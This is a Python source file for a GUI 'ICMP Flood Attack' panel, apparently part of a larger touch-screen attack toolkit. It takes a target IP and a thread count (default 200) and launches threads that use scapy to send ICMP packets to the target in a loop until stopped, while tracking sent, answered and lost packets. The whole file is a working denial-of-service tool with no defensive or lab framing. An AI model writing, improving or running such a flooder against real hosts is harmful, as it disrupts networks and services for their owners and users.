from scapy.all import IP, ICMP, sr1
import threading
import customtkinter as ctk
import time
from virtual_keyboard import NumericKeyboard

stop_flag = False
sent_count = 0
received_count = 0
start_time = None
lock = threading.Lock()

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def create_icmp_flood_ui(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)

    label_title = ctk.CTkLabel(parent_frame, text="ICMP Flood Attack", font=("Arial", 24))
    label_title.pack(pady=10)

    ip_entry = ctk.CTkEntry(parent_frame, placeholder_text="Target IP", width=300)
    ip_entry.pack(pady=10)

    count_entry = ctk.CTkEntry(parent_frame, placeholder_text="Number of ICMP packets", width=300)
    count_entry.pack(pady=10)

    thread_entry = ctk.CTkEntry(parent_frame, placeholder_text="Number of threads", width=300)
    thread_entry.pack(pady=10)

    def start_icmp_flood():
        global target_ip, thread_count, max_packets
        global start_time, stop_flag, sent_count, received_count

        target_ip = ip_entry.get() or target_ip
        thread_count = int(thread_entry.get() or 200)

        
        max_packets_entry = count_entry.get()
        max_packets = int(max_packets_entry) if max_packets_entry.isdigit() else None

        sent_count = 0
        received_count = 0
        stop_flag = False
        start_time = time.time()

        clear_frame(parent_frame)

        info_frame = ctk.CTkFrame(parent_frame, width=400, height=400, corner_radius=10)
        info_frame.place(relx=0.5, rely=0.5, anchor="center")

        label_sent = ctk.CTkLabel(info_frame, text="Packets sent:", font=("Arial", 16))
        label_sent.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        value_sent = ctk.CTkLabel(info_frame, text="0", font=("Arial", 16))
        value_sent.grid(row=0, column=1, padx=10, pady=5, sticky="e")

        label_received = ctk.CTkLabel(info_frame, text="Replies received:", font=("Arial", 16))
        label_received.grid(row=1, column=0, padx=10, pady=5, sticky="w")
        value_received = ctk.CTkLabel(info_frame, text="0", font=("Arial", 16))
        value_received.grid(row=1, column=1, padx=10, pady=5, sticky="e")

        label_lost = ctk.CTkLabel(info_frame, text="Lost packets:", font=("Arial", 16))
        label_lost.grid(row=2, column=0, padx=10, pady=5, sticky="w")
        value_lost = ctk.CTkLabel(info_frame, text="0", font=("Arial", 16))
        value_lost.grid(row=2, column=1, padx=10, pady=5, sticky="e")

        label_time = ctk.CTkLabel(info_frame, text="Time running:", font=("Arial", 16))
        label_time.grid(row=3, column=0, padx=10, pady=5, sticky="w")
        value_time = ctk.CTkLabel(info_frame, text="0s", font=("Arial", 16))
        value_time.grid(row=3, column=1, padx=10, pady=5, sticky="e")

        stop_btn = ctk.CTkButton(info_frame, text="Stop Flood", command=stop_icmp_flood)
        stop_btn.grid(row=4, column=0, columnspan=2, pady=20)

        back_button = ctk.CTkButton(
            parent_frame,
            text="← Back",
            command=lambda: go_back_callback() if go_back_callback else None,
            font=("Arial", 16),
            width=parent_frame.winfo_width() * 0.7,
            height=40
        )
        back_button.pack(pady=10)
    
        def update_ui():
            if not stop_flag:
                elapsed = int(time.time() - start_time)
                with lock:
                    value_sent.configure(text=str(sent_count))
                    value_received.configure(text=str(received_count))
                    value_lost.configure(text=str(sent_count - received_count))
                    value_time.configure(text=f"{elapsed}s")
                parent_frame.after(1000, update_ui)

        update_ui()

        # Запуск потоков
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=icmp_flood)
            t.daemon = True
            t.start()
            threads.append(t)

    start_button = ctk.CTkButton(parent_frame, text="Start Flood", command=start_icmp_flood)
    start_button.pack(pady=10)

def stop_icmp_flood():
    global stop_flag
    stop_flag = True

def icmp_flood():
    global sent_count, received_count
    packet = IP(dst=target_ip) / ICMP()
    while not stop_flag:
        response = sr1(packet, timeout=1, verbose=0)
        with lock:
            sent_count += 1
            if response:
                received_count += 1
